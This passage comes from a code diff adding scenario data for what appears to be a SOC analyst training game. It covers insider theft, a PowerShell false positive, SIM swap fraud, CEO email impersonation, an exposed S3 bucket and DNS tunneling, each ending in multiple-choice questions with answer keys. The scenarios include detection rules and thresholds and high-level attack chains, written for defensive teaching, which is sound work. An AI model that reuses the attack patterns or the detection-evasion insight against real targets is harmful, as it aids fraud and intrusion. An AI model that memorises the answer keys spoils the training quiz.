+       {t:"Let HR handle it quietly — avoid drama",c:false,w:"Wrong. Data theft of source code and customer PII is a legal and regulatory matter. Quiet resolution without documentation exposes the company to regulatory risk."},
+       {t:"Accept his explanation — close the incident",c:false,w:"Wrong. Customer PII (14,832 records) on an unencrypted USB is a data breach regardless of intent. It must be reported and documented."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:15,icon:"📋",
+     title:"Incident report — insider data theft",
+     brief:"Document the breach, credential rotation status, and regulatory obligations.",
+     reportData:{"Incident ID":"INC-2026-0561","Type":"Insider Threat — Data Exfiltration","Employee":"ankit.joshi@corp.in (resigned)","Data Stolen":"Source code (312 files) + production credentials + 14,832 customer records","Credentials Rotated":"DB ✓ · Stripe ✓ · Sendgrid ✓ · JWT ✓","USB Status":"Legal hold requested","Status":"CONTAINED — regulatory notification pending"},
+     decision:{q:"14,832 customer records were on the USB. Under Indian law, what are your obligations?",opts:[
+       {t:"Report to CERT-In within 6 hours + notify affected customers + preserve evidence for potential prosecution",c:true,w:"Correct. DPDPA 2023 and CERT-In guidelines require breach notification. Customer PII exposure must be reported. Evidence must be preserved for legal action."},
+       {t:"No obligation — the employee was the one who stole data, not the company",c:false,w:"Wrong. The company held the data. The breach occurred on company systems. The company is the data fiduciary under DPDPA and bears the reporting obligation."},
+       {t:"Only report if customers are harmed",c:false,w:"Wrong. DPDPA requires proactive notification of data breaches, not reactive notification after harm occurs."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 5. FALSE POSITIVE — PowerShell storm
+// IT admin maintenance vs attacker
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0502":{
+  title:"False Positive — PowerShell Storm",
+  subtitle:"47 alerts on the domain controller — IT admin or attacker?",
+  tag:"INDUSTRY STANDARD · FALSE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"⚡",
+     title:"47 PowerShell alerts on DC-01 — triage fast",
+     brief:"BlueTrace SIEM just fired 47 PowerShell alerts on DC-01 in 3 minutes. At 10AM on a Monday. Read the alerts and correlate before escalating.",
+     siemData:{alerts:[
+       {id:"PS-001",sev:"HIGH",time:"10:02:14",rule:"POWERSHELL_SCRIPT_EXECUTION",msg:"powershell.exe -ExecutionPolicy Bypass running on DC-01",key:true,
+        det:{"Host":"DC-01 (Domain Controller)","User":"svc_backup@corp.internal","Script":"C:\Windows\System32\WindowsPowerShell\v1.0\","Count":"47 instances in 3 minutes","Risk Score":"72/100","Initiating user":"svc_backup — service account"}},
+       {id:"PS-002",sev:"HIGH",time:"10:02:16",rule:"SCHEDULED_TASK_MODIFICATION",msg:"Scheduled task 'Weekly_Patch_Check' modified by svc_backup",
+        det:{"Task":"Weekly_Patch_Check","Modified by":"svc_backup","Action":"Updated script path for patch Tuesday","Change ticket":"CHG-2026-4421"}},
+       {id:"PS-003",sev:"HIGH",time:"10:02:44",rule:"GROUP_POLICY_UPDATE",msg:"Group policy updated across 24 machines via DC-01",
+        det:{"Updated by":"svc_backup","Scope":"24 workstations","Policy":"Software deployment — Patch Tuesday","Change ticket":"CHG-2026-4421","Schedule":"Every 2nd Monday"}},
+     ]},
+     decision:{q:"47 PowerShell alerts, but: service account (svc_backup), change ticket CHG-2026-4421 exists, it is Monday morning (Patch Tuesday prep). What is this?",opts:[
+       {t:"False positive — authorised IT maintenance matching an approved change ticket",c:true,w:"Correct. All indicators point to legitimate activity: service account (not user), change ticket exists, Monday morning timing, patch-related scripts. Correlate with CMDB and close."},
+       {t:"True positive — PowerShell on a DC is always suspicious",c:false,w:"Wrong. Context matters. Service accounts running authorised patch scripts on a DC during change window is expected behaviour. Do not alert on every PowerShell execution."},
+       {t:"Escalate immediately — never trust PowerShell on a DC",c:false,w:"Wrong. This would create alert fatigue. Verify the change ticket first. CHG-2026-4421 exists and matches. This is authorised."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"✅",
+     title:"Verify the change ticket — confirm it is authorised",
+     brief:"Check CHG-2026-4421 in the CMDB. Verify the script hash matches the approved script. Confirm the service account is the correct one.",
+     procData:{host:"DC-01 (Domain Controller)",procs:[
+       {n:"powershell.exe",pid:2201,d:0,s:"normal",info:{"User":"svc_backup@corp.internal","Script hash":"a1b2c3d4e5f6 (matches approved)","Change ticket":"CHG-2026-4421 — approved by Parvez M","Schedule":"Every 2nd Monday 10:00–11:00 IST","Verdict":"AUTHORISED — matches approved change"}},
+       {n:"Update-WindowsPatches.ps1",pid:2202,d:1,s:"normal",info:{"Script":"C:\Scripts\Patching\Update-WindowsPatches.ps1","Hash":"matches CHG-2026-4421 approved hash","Action":"Check Windows Update status on 24 machines","Verdict":"Legitimate patch management script"}},
+     ],hashTarget:{hash:"a1b2c3d4e5f6",score:2,family:"Clean — internal approved script",detections:"0/70 AV engines",c2:"N/A — internal only"}},
+     decision:{q:"Script hash matches the approved change ticket. Same hash approved by change manager. What do you do?",opts:[
+       {t:"Close as false positive — document findings, tune detection rule",c:true,w:"Correct. Verified authorised activity. Close as false positive. Then tune the detection rule to suppress alerts for authorised service accounts during approved change windows."},
+       {t:"Still escalate — better safe than sorry",c:false,w:"Wrong. Unnecessary escalation of verified false positives degrades trust in the SOC and wastes security team time. Verify, document, close, tune."},
+       {t:"Block the service account as a precaution",c:false,w:"Wrong. Blocking an authorised service account during a maintenance window will break the patch cycle for 24 machines. This is an operational incident, not a security decision."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:15,icon:"📋",
+     title:"Close the false positive — document and tune",
+     brief:"Document why this was a false positive and recommend a rule tuning to prevent this alert from firing on authorised activity.",
+     reportData:{"Incident ID":"INC-2026-0502","Classification":"FALSE POSITIVE","Activity":"Authorised patch maintenance via service account","Change Ticket":"CHG-2026-4421 — approved","User":"svc_backup (service account)","Recommendation":"Tune rule to exclude svc_backup during approved change windows","Status":"CLOSED — tuning recommended"},
+     decision:{q:"This alert fired 47 times in 3 minutes. How do you prevent this false positive recurring every Patch Tuesday?",opts:[
+       {t:"Add exception: suppress POWERSHELL_SCRIPT_EXECUTION for svc_backup when a valid CHG ticket exists",c:true,w:"Correct. Context-aware tuning: suppress alerts for known service accounts + valid change tickets. This maintains detection coverage while eliminating known-good noise."},
+       {t:"Disable the POWERSHELL_SCRIPT_EXECUTION rule entirely",c:false,w:"Wrong. Disabling the rule removes coverage for real PowerShell attacks. Tune it with exceptions, do not disable it."},
+       {t:"Do nothing — false positives are expected",c:false,w:"Wrong. Untuned false positives cause alert fatigue, which leads analysts to ignore real alerts. Every false positive must be tuned."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 6. SIM SWAP — India
+// Real pattern: attacker impersonates victim at telecom store
+// Based on: news pattern — ₹lakhs stolen via SIM swap + net banking
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0578":{
+  title:"SIM Swap Attack — Net Banking Takeover",
+  subtitle:"Attacker got a duplicate SIM, bypassed OTP, drained ₹12.4 lakh",
+  tag:"INDIA · TRUE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"📵",
+     title:"Multiple OTP auth + large transfers after SIM activity",
+     brief:"Bank fraud system flagged 11 consecutive OTP authentications in 18 minutes on Meera Nair's account, followed by ₹12.4 lakh transferred to 3 new accounts. Read the alert.",
+     siemData:{alerts:[
+       {id:"SIM-001",sev:"CRITICAL",time:"14:28:02",rule:"SIM_SWAP_PATTERN",msg:"Meera Nair's SIM deactivated on original phone at 14:15. New SIM activated same number. 11 OTP requests in 18 min.",key:true,
+        det:{"Customer":"Meera Nair · Mumbai","Original SIM":"Deactivated 14:15 IST","New SIM":"Activated 14:16 IST same number","OTP requests":"11 in 18 minutes","Customer phone status":"No signal since 14:15 (SIM dead)","Risk Score":"99/100"}},
+       {id:"SIM-002",sev:"CRITICAL",time:"14:31:18",rule:"NEW_BENEFICIARY_LARGE_TRANSFER",msg:"₹4,50,000 to new beneficiary — 0 minutes cooling period bypassed via OTP",
+        det:{"Amount":"₹4,50,000","Beneficiary":"New account (added 2 min ago)","OTP used":"Yes — received on new SIM","Normal cooling period":"30 min for new beneficiary","Override":"OTP override used — no cooling period"}},
+       {id:"SIM-003",sev:"CRITICAL",time:"14:44:55",rule:"VELOCITY_BREACH_FRAUD",msg:"Total ₹12,40,000 transferred in 18 minutes to 3 new accounts",
+        det:{"Total transferred":"₹12,40,000","Transactions":"3 (₹4.5L + ₹4.2L + ₹3.7L)","Beneficiaries":"All new — added in last 20 minutes","Pattern":"Classic SIM swap fraud sequence"}},
+     ]},
+     decision:{q:"SIM deactivated on victim phone at 14:15. New SIM activated same minute. 11 OTPs and ₹12.4L gone in 18 minutes. Classification?",opts:[
+       {t:"True positive — SIM swap fraud, freeze account and mule accounts immediately",c:true,w:"Correct. SIM swap + OTP bypass + rapid large transfers to new accounts is a confirmed fraud pattern. Freeze the account and the 3 destination accounts immediately."},
+       {t:"Could be customer changing phone — verify first",c:false,w:"Wrong. ₹12.4 lakh transferred while the customer's phone has no signal. If it were a legitimate SIM change, the customer would know and would not be transferring their entire account in 18 minutes."},
+       {t:"OTPs were valid — transfers are authorised",c:false,w:"Wrong. OTPs generated on a fraudulently obtained SIM are not genuinely authorised. The customer did not consent to these transfers."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"📞",
+     title:"Trace how the attacker got the duplicate SIM",
+     brief:"Telecom company logs show the SIM swap request. Check how the attacker impersonated the customer to get the duplicate SIM from the store.",
+     procData:{host:"Telecom Store — Andheri West",procs:[
+       {n:"SIM swap request",pid:9901,d:0,s:"malicious",info:{"Requested by":"Person claiming to be Meera Nair","Documents provided":"Printed copy of Aadhaar (low quality)","Store employee":"Did not call customer to verify","Verification done":"Document check only — no biometric","Time":"14:13 IST"}},
+       {n:"Customer data source",pid:9902,d:1,s:"suspicious",info:{"How attacker got info":"Customer data possibly from data broker or social media","Aadhaar copy":"May have been from leaked database or phishing","Phone number":"Publicly available on LinkedIn profile","Verdict":"Social engineering + data from breach or social media"}},
+       {n:"Call to bank",pid:9903,d:1,s:"malicious",info:{"Action":"Attacker called bank helpline at 14:25","Claimed":"Lost phone, need to set up net banking on new number","Bank response":"Sent OTP to new SIM — confirmed new device setup","Verdict":"Completed account takeover via bank helpline call"}},
+     ],hashTarget:{hash:"SIM:SWAP:Airtel:INC0544",score:99,family:"SIM Swap Fraud — confirmed",detections:"Telecom + bank confirmation",c2:"Physical SIM card"}},
+     decision:{q:"Attacker used a printed Aadhaar copy (possibly from a data breach). How could the telecom store have prevented this?",opts:[
+       {t:"Mandatory biometric verification (fingerprint) + call to registered number before SIM swap",c:true,w:"Correct. TRAI guidelines require customer verification for SIM swaps. Biometric verification makes fake document attacks much harder. A call to the existing SIM before deactivation would alert the real customer."},
+       {t:"Better quality Aadhaar printer — the copy was low quality",c:false,w:"Wrong approach. The issue is not the quality of the document — it is that a printed copy was accepted at all. Biometric verification is required."},
+       {t:"Store cannot be held responsible — they followed procedure",c:false,w:"Wrong. TRAI mandates specific verification procedures for SIM swaps. Failure to follow them creates liability."},
+     ]}},
+    {id:"network",phase:"CONTAINMENT",phaseClass:"ph-c",xp:25,icon:"🚨",
+     title:"Contain — freeze accounts, contact telecom, file complaint",
+     brief:"3 mule accounts received the money. Freeze them. Contact the telecom to cancel the fraudulent SIM. File cyber crime complaint.",
+     connData:{src:"Fraudulent SIM → Meera Nair's account",dst:"3 mule accounts (₹12.4L)",status:"FUNDS PARTIALLY AVAILABLE — freeze window open"},
+     decision:{q:"Telecom says the SIM swap was done with valid documents. They refuse to cancel it. What is your next action?",opts:[
+       {t:"Escalate to TRAI, file cyber crime FIR, disable net banking on the account, freeze mule accounts",c:true,w:"Correct. If the telecom refuses, escalate to the regulator (TRAI). Meanwhile, disable net banking to prevent further damage. Freeze the mule accounts (banks can do this). File the FIR."},
+       {t:"Accept the telecom's response — the SIM swap was valid",c:false,w:"Wrong. A valid document does not make a fraudulent SIM swap legal. The customer did not authorise it. The crime has occurred regardless of the telecom's position."},
+       {t:"Sue the telecom — take it to court immediately",c:false,w:"Litigation is a long-term action. Immediate priority is stopping ongoing fraud: freeze accounts, file FIR, disable net banking."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:15,icon:"📋",
+     title:"Incident report — SIM swap fraud",
+     brief:"Document the attack chain, recovery status, and preventive recommendations.",
+     reportData:{"Incident ID":"INC-2026-0578","Type":"SIM Swap Fraud","Amount Lost":"₹12,40,000","Recovery":"₹3,70,000 frozen in 1 of 3 accounts","Attack Chain":"Data recon → Fake SIM swap → OTP intercept → Fund transfer","Telecom":"Airtel (store — Andheri West)","Status":"PARTIAL RECOVERY — FIR filed, TRAI complaint submitted"},
+     decision:{q:"How should the bank change its OTP process to prevent SIM swap fraud?",opts:[
+       {t:"Add SIM swap detection: if customer's SIM changed in last 24 hours, require additional verification before large transfers",c:true,w:"Correct. Most banks now check with telecom APIs for recent SIM changes. If a SIM was swapped in the last 24-48 hours, block or require in-person verification for large transactions."},
+       {t:"Remove OTP entirely — it is not secure",c:false,w:"Wrong. OTP is still a valid factor when SIM swap is properly prevented. The issue is the SIM swap vulnerability, not OTP itself."},
+       {t:"Only allow transfers from registered devices — no OTP",c:false,w:"Partially correct but device binding alone is not sufficient and creates usability issues. SIM swap detection + device binding together is better."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 7. BEC FRAUD — CEO Impersonation
+// Industry standard — Business Email Compromise
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0612":{
+  title:"BEC Fraud — CEO Email Impersonation",
+  subtitle:"Finance team wired ₹28 lakh to attacker's account on fake CEO instruction",
+  tag:"INDUSTRY STANDARD · TRUE POSITIVE",
+  scenes:[
+    {id:"email",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"👔",
+     title:"Urgent wire transfer request — from CEO email?",
+     brief:"The finance manager received an email from what looks like the CEO's email asking for an urgent ₹28 lakh wire transfer for a confidential acquisition. Read it carefully.",
+     emailData:{
+       from:"vikram.sharma@corp-india.in",
+       subject:"URGENT CONFIDENTIAL — Wire transfer required today",
+       body:`Hi Sunita,
+
+I need you to process an urgent wire transfer today.
+We are closing a confidential acquisition and the payment
+must go out before 4PM to avoid deal falling through.
+
+Amount: ₹28,00,000
+Account: ICICI Bank — 1234567890
+IFSC: ICIC0001234
+Beneficiary: Global Ventures Advisory LLP
+
+Please do not discuss with anyone — deal is confidential.
+Do not call me — I am in a board meeting all day.
+
+Process immediately and confirm via email.
+
+Best,
+Vikram Sharma
+CEO — Corp India`,
+       iocs:[
+         "Domain: corp-india.in (company is corp.in — one letter difference)",
+         "Request for secrecy — do not discuss with anyone",
+         "Do not call — prevents voice verification",
+         "Urgency pressure — 4PM deadline",
+         "Wire to unknown account with no prior transactions"
+       ]
+     },
+     decision:{q:"CEO asking for ₹28L urgent wire, do not tell anyone, do not call me. Domain is corp-india.in not corp.in. What is this?",opts:[
+       {t:"BEC fraud — impersonation via lookalike domain. Do not transfer. Report to real CEO.",c:true,w:"Correct. Lookalike domain (corp-india.in ≠ corp.in), urgency, secrecy, and no-call instruction are all BEC red flags. Verify with the real CEO via phone before any transfer."},
+       {t:"Process the transfer — CEO says it is urgent",c:false,w:"Wrong. This matches every BEC red flag. The CEO would not ask you to bypass verification for ₹28 lakh. Always verify by calling the actual CEO directly."},
+       {t:"Reply to the email to confirm — then transfer",c:false,w:"Wrong. Replying to the email confirms to the attacker that the approach is working. Call the real CEO on their known phone number — do not reply to the suspicious email."},
+     ]}},
+    {id:"siem",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"🔍",
+     title:"Investigate the domain — when was corp-india.in registered?",
+     brief:"Check the domain registration details and email headers. How long has this domain existed?",
+     siemData:{alerts:[
+       {id:"BEC-001",sev:"CRITICAL",time:"11:44:18",rule:"LOOKALIKE_DOMAIN_EMAIL",msg:"Email from corp-india.in — registered 3 days ago — matches corp.in brand pattern",key:true,
+        det:{"Sender domain":"corp-india.in","Company domain":"corp.in","Domain age":"3 days","Registrar":"Namecheap — privacy protected","MX records":"Configured to forward replies to attacker","SPF/DMARC":"Configured (legitimate-looking)","Verdict":"Lookalike domain registered for targeted BEC attack"}},
+       {id:"BEC-002",sev:"HIGH",time:"11:44:20",rule:"EXECUTIVE_IMPERSONATION",msg:"Email body matches CEO name, title, and signature format — impersonation",
+        det:{"Name match":"Vikram Sharma (correct)","Title match":"CEO — Corp India (correct)","Signature format":"Matches real CEO email template","Source":"Likely copied from public LinkedIn or previous email leak"}},
+     ]},
+     decision:{q:"Domain registered 3 days ago specifically for this attack. CEO confirmed he sent no such email. Total fraud attempt. What do you do?",opts:[
+       {t:"Block corp-india.in at email gateway, preserve email as evidence, alert all finance staff",c:true,w:"Correct. Block the domain so no other employee gets this email. Preserve the email headers and content as evidence. Alert finance team immediately about this BEC campaign."},
+       {t:"Just delete the email — threat is neutralised",c:false,w:"Wrong. Deleting removes evidence. The domain is still active and could target other employees. Block the domain and preserve evidence."},
+       {t:"Report to police only — nothing else needed",c:false,w:"Wrong. Report to police yes, but also: block the domain now, alert all staff, check if anyone else received it or already transferred money."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:20,icon:"📋",
+     title:"Post-incident — prevent next BEC attempt",
+     brief:"This time nobody transferred the money. Document what controls prevented it and what to add.",
+     reportData:{"Incident ID":"INC-2026-0612","Type":"BEC Fraud — CEO Impersonation","Amount Targeted":"₹28,00,000","Amount Lost":"₹0 — detected before transfer","Attack Vector":"Lookalike domain corp-india.in (3 days old)","Status":"BLOCKED — no financial loss"},
+     decision:{q:"What single control would prevent most BEC fraud attempts?",opts:[
+       {t:"Dual approval required for any wire transfer above ₹5 lakh — verbal confirmation from second signatory",c:true,w:"Correct. Dual approval via a separate channel makes it impossible for a single email to authorise a large transfer. The second approver will independently verify with the real executive."},
+       {t:"Train employees better — they should spot BEC emails",c:false,w:"Training helps but is not sufficient. Even trained employees can be caught under time pressure. Process controls (dual approval) are more reliable than human vigilance."},
+       {t:"Use a different email provider",c:false,w:"Wrong. The attack came from an external lookalike domain. Email provider is irrelevant. Process controls and verification procedures are what matters."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 8. CLOUD MISCONFIGURATION — S3 Bucket Public Exposure
+// Industry standard
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0634":{
+  title:"S3 Bucket Exposed — Customer Data Public",
+  subtitle:"82,000 customer records publicly accessible for 6 days",
+  tag:"INDUSTRY STANDARD · TRUE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"☁️",
+     title:"Security researcher reported: S3 bucket is public",
+     brief:"A security researcher emailed your responsible disclosure address. They found an S3 bucket with customer data that is publicly accessible. Read the report.",
+     siemData:{alerts:[
+       {id:"S3-001",sev:"CRITICAL",time:"09:12:00",rule:"PUBLIC_S3_BUCKET_EXTERNAL_REPORT",msg:"Responsible disclosure: s3://corp-customer-backups-prod is publicly accessible",key:true,
+        det:{"Bucket":"s3://corp-customer-backups-prod","Access":"PUBLIC — no authentication required","Contents":"customer_data_2026.csv (2.1 GB)","Records":"82,147 customer records","Fields":"name, email, phone, address, DOB, transaction history","Duration":"Public for approximately 6 days (since last deployment)","Reported by":"Security researcher — responsible disclosure"}},
+       {id:"S3-002",sev:"CRITICAL",time:"09:12:02",rule:"PII_DATA_EXPOSURE",msg:"82,147 customer PII records accessible without authentication",
+        det:{"Data types":"Full name, email, phone, address, date of birth, 12-month transaction history","Sensitivity":"HIGH — PII + financial data","Regulatory impact":"DPDPA 2023 — mandatory breach notification","Potential harm":"Identity theft, financial fraud, targeted phishing"}},
+     ]},
+     decision:{q:"S3 bucket with 82,147 customer records has been publicly accessible for 6 days. Researcher reported it responsibly. What is your first action?",opts:[
+       {t:"Make the bucket private immediately, then assess what data was accessed",c:true,w:"Correct. Stop the bleeding first. Make the bucket private NOW. Then check S3 access logs to understand what was accessed and by whom during the 6-day exposure window."},
+       {t:"Verify the researcher's claim before doing anything",c:false,w:"Wrong priority. If the researcher is right, every second of verification is another second of public exposure. Check the bucket yourself — it takes 30 seconds. Make it private first."},
+       {t:"Notify customers first, then secure the bucket",c:false,w:"Wrong order. Secure the data first to stop ongoing exposure. Then assess the scope. Then notify."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:25,icon:"🔍",
+     title:"Check S3 access logs — who accessed the data?",
+     brief:"Pull the S3 server access logs for the last 6 days. Check how many unique IPs downloaded the data and whether any known bad actors accessed it.",
+     procData:{host:"AWS S3 — corp-customer-backups-prod",procs:[
+       {n:"S3 access logs",pid:7701,d:0,s:"suspicious",info:{"Total requests":"1,847 in 6 days","Unique IPs":"23 unique IPs accessed the bucket","Large downloads":"4 IPs downloaded the full 2.1 GB file","Security researcher":"1 confirmed legitimate researcher IP","Unknown IPs":"3 IPs with no attribution — possible malicious access"}},
+       {n:"Suspicious download — IP 1",pid:7702,d:1,s:"malicious",info:{"IP":"185.220.101.91","Download":"Full 2.1 GB customer CSV at 03:17 IST (3 days ago)","Known status":"Registered to bulletproof hosting provider","Verdict":"High probability — malicious actor downloaded customer data"}},
+       {n:"Bucket policy change",pid:7703,d:1,s:"suspicious",info:{"Changed by":"terraform-ci-deploy IAM role","Change":"Removed bucket ACL restrictions during deployment","Root cause":"Terraform config had PublicRead ACL — not caught in code review","Duration":"6 days exposed"}},
+     ],hashTarget:{hash:"S3:CORP-CUST-BACKUP",score:85,family:"Misconfiguration — Public S3 bucket",detections:"Data downloaded by 3 unknown IPs",c2:"N/A"}},
+     decision:{q:"3 unknown IPs (including one bulletproof hosting IP) downloaded the full 2.1 GB customer file. What must you assume?",opts:[
+       {t:"Assume full data breach — 82,147 customers' PII is in attacker hands",c:true,w:"Correct. When a bulletproof hosting IP downloads your full customer database, assume compromise. You cannot un-ring this bell. Notify customers, report to regulators, monitor for downstream fraud."},
+       {t:"Maybe they were just crawlers — wait for fraud reports",c:false,w:"Wrong. A bulletproof hosting provider downloading your full 2.1 GB customer database is not a crawler. Assume breach and act accordingly."},
+       {t:"Only notify the 82,000 customers if someone misuses the data",c:false,w:"Wrong. DPDPA 2023 requires proactive notification of a data breach, not reactive notification after harm occurs."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:20,icon:"📋",
+     title:"Breach notification and remediation",
+     brief:"Data was breached. Document and notify. This is a regulatory event.",
+     reportData:{"Incident ID":"INC-2026-0634","Type":"Cloud Misconfiguration — Data Breach","Records Exposed":"82,147 customer PII + transaction history","Exposed for":"6 days","Root cause":"Terraform config with PublicRead ACL not caught in review","Bucket status":"PRIVATE — secured","Status":"BREACH CONFIRMED — regulatory notification required"},
+     decision:{q:"Root cause was a Terraform config with PublicRead ACL. How do you prevent this permanently?",opts:[
+       {t:"Add S3 public access block at AWS account level + mandatory security review in CI/CD pipeline for S3 changes",c:true,w:"Correct. AWS account-level S3 Block Public Access prevents ANY S3 bucket from going public regardless of Terraform config. CI/CD security gates catch misconfigurations before they deploy."},
+       {t:"Audit Terraform configs manually every week",c:false,w:"Manual audits are error-prone and slow. Automated controls at the AWS account level and in CI/CD are reliable and always-on."},
+       {t:"Remove Terraform access from developers",c:false,w:"This kills developer productivity. The solution is guardrails (automated checks), not removing access."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 9. DNS BEACON — Advanced Persistent Threat
+// Industry standard
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0651":{
+  title:"DNS Beacon — Stealthy C2 Channel",
+  subtitle:"Attacker hiding C2 traffic inside DNS queries — 14-day dwell time",
+  tag:"INDUSTRY STANDARD · TRUE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"🔮",
+     title:"Anomalous DNS traffic — 14 days undetected",
+     brief:"Network team flagged unusual DNS patterns on the monthly traffic review. 2,340 DNS queries per hour to cdn-metrics.net — each with encoded subdomains. Read the alert.",
+     siemData:{alerts:[
+       {id:"DNS-001",sev:"HIGH",time:"08:00:00",rule:"DNS_TUNNELING_PATTERN",msg:"WS-RESEARCH-07 — 2,340 DNS queries/hr to cdn-metrics.net — high entropy subdomains",key:true,
+        det:{"Host":"WS-RESEARCH-07","Domain":"cdn-metrics.net","Query rate":"2,340 per hour (normal: <50)","Subdomain entropy":"5.2 (threshold: 3.5)","Example query":"aGVsbG8gd29ybGQ.cdn-metrics.net (base64 encoded data)","First seen":"14 days ago","Verdict":"DNS tunneling — C2 channel via DNS queries"}},
+       {id:"DNS-002",sev:"HIGH",time:"08:00:05",rule:"LOW_AND_SLOW_EXFILTRATION",msg:"Estimated 180 MB exfiltrated via DNS over 14 days",
+        det:{"Channel":"DNS TXT record responses","Daily volume":"~13 MB per day","Total estimated":"180 MB in 14 days","Content":"Encrypted — cannot read without key","Dwell time":"14 days undetected — APT pattern"}},
+     ]},
+     decision:{q:"DNS tunneling for 14 days. Encrypted data going out via DNS queries. 180 MB estimated exfiltrated. What makes DNS tunneling hard to detect?",opts:[
+       {t:"DNS queries are allowed through firewalls by default and blend with legitimate traffic",c:true,w:"Correct. DNS is almost never blocked — it is required for normal network operation. Attackers abuse this by encoding C2 traffic in DNS queries. Detection requires entropy analysis and query rate monitoring."},
+       {t:"DNS is encrypted — impossible to inspect",c:false,w:"Not the reason. DNS-over-HTTPS is encrypted, but standard DNS is plaintext. The difficulty is not encryption — it is that DNS traffic is voluminous and firewalls always allow it."},
+       {t:"The malware was very sophisticated",c:false,w:"DNS tunneling is a well-known technique, not necessarily sophisticated malware. The dwell time is long because organisations rarely monitor DNS query entropy."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:25,icon:"🧬",
+     title:"Find the implant on WS-RESEARCH-07",
+     brief:"Identify the process generating the DNS queries. Hash it. Check what data has been accessed.",
+     procData:{host:"WS-RESEARCH-07",procs:[
+       {n:"svchost.exe",pid:6601,d:0,s:"normal",info:{"Path":"C:\Windows\System32\svchost.exe","Hash":"matches known good","Verdict":"Legitimate system process"}},
+       {n:"WmiPrvSE.exe",pid:6602,d:1,s:"suspicious",info:{"Spawned by":"svchost.exe (unusual)","DNS queries":"Yes — generating all anomalous queries","Hash":"differs from known good by 2 bytes","Verdict":"Trojanized WmiPrvSE — implant masquerading as WMI provider"}},
+       {n:"Research data access",pid:6603,d:1,s:"malicious",info:{"Files accessed":"D:\Research\Q4_Product_Roadmap.pdf, D:\Research\Patent_Applications\","Volume":"~180 MB over 14 days","Method":"Encoded in DNS subdomain labels and exfiltrated","Verdict":"Intellectual property theft"}},
+     ],hashTarget:{hash:"WmiPrvSE.exe:modified",score:94,family:"APT.DNSTunnel.Customized",detections:"31/70 AV engines (low — custom implant)",c2:"cdn-metrics.net (DNS tunneling)"}},
+     decision:{q:"Trojanized WmiPrvSE.exe, 14-day dwell, research data exfiltrated via DNS. This is an APT. What is the containment priority?",opts:[
+       {t:"Isolate the machine, sinkhole cdn-metrics.net, check if other hosts communicate with same domain",c:true,w:"Correct. Isolate to stop ongoing exfiltration. Sinkhole the C2 domain to detect other infected hosts. APTs often compromise multiple machines — check all hosts for the same DNS pattern."},
+       {t:"Just delete the trojanized file and continue monitoring",c:false,w:"Wrong. APTs establish multiple persistence mechanisms. Deleting one file does not evict them. Full incident response: isolate, forensic analysis, reimaging, credential rotation."},
+       {t:"Block cdn-metrics.net at the firewall — problem solved",c:false,w:"Wrong. APTs have backup C2 infrastructure. Blocking one domain delays them by hours. Full eviction requires forensic analysis of the entire machine."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:20,icon:"📋",
+     title:"APT incident report — 14-day dwell",
+     brief:"Document what was stolen, how long the attacker was in, and how to detect DNS tunneling in the future.",
+     reportData:{"Incident ID":"INC-2026-0651","Type":"APT — DNS Tunneling C2","Dwell Time":"14 days","Data Exfiltrated":"~180 MB — product roadmap + patent applications","Malware":"Trojanized WmiPrvSE.exe","C2":"cdn-metrics.net (DNS tunneling)","Status":"CONTAINED — forensic investigation ongoing"},
+     decision:{q:"How do you detect DNS tunneling earlier — before 14 days of dwell?",opts:[
+       {t:"Monitor DNS query entropy and rate per host — alert on >3.5 entropy or >500 queries/hour to a single domain",c:true,w:"Correct. DNS tunneling has two signatures: high subdomain entropy (encoded data looks random) and high query rate (need many queries to tunnel data). Both thresholds will catch most DNS tunneling within hours."},
+       {t:"Block all external DNS — only allow internal DNS resolver",c:false,w:"Partially helpful but breaks many legitimate services. The better approach is monitoring and anomaly detection on the internal resolver rather than blocking."},
+       {t:"Deploy more antivirus — it will catch the implant",c:false,w:"Wrong. This implant was detected by only 31/70 AV engines. Signature-based AV is insufficient for APT-grade custom implants. Behavioural detection (DNS anomalies) is what caught it."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 10. FALSE POSITIVE — Auth storm
+// Pen test traffic misidentified as attack
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0591":{
+  title:"False Positive — Authorised Pentest Traffic",
+  subtitle:"1,200 brute force alerts — actually your own security team testing",
+  tag:"INDUSTRY STANDARD · FALSE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"🔓",
+     title:"1,200 brute force alerts — under attack?",
+     brief:"SIEM fired 1,200 brute force alerts in 2 minutes against the VPN login page. Source IP: 103.22.14.88. Read the alerts before escalating.",
